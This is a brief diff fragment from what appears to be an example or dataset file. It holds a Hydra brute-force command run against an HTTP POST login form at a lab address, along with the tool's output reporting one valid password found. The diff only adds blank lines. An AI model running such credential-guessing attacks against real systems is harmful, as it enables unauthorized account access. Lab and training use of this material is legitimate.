@@ -10,6 +10,7 @@ output: 'root@kali:~# hydra -L users.txt -P wordlist.txt 10.10.10.10  http-post-
   Hydra v8.8 (c) 2019 by van Hauser/THC - Please do not use in military or secret
   service organizations, or for illegal purposes.
 
+
   Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 20:27:03
 
   [DATA] max 16 tasks per 1 server, overall 16 tasks, 104 login tries (l:1/p:104),
@@ -45,3 +46,5 @@ Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2019-09-24 20:27:
 1 of 1 target successfully completed, 1 valid password found
 Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2019-09-24 20:27:24
 ```
+
+
